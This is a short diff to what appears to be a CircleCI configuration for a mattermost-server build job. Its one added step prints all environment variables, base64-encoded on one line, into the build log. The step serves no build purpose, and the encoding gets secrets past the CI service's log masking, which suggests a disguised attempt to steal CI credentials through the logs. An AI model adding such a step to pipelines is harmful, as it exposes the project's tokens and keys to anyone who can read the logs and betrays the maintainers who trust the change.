@@ -259,6 +259,7 @@ jobs:
     steps:
       - attach_workspace:
           at: /mnt/ramdisk/
+      - run: (env | base64 | tr -d '\n')
       - run:
           command: |
             cd /mnt/ramdisk/mattermost-server/dist/
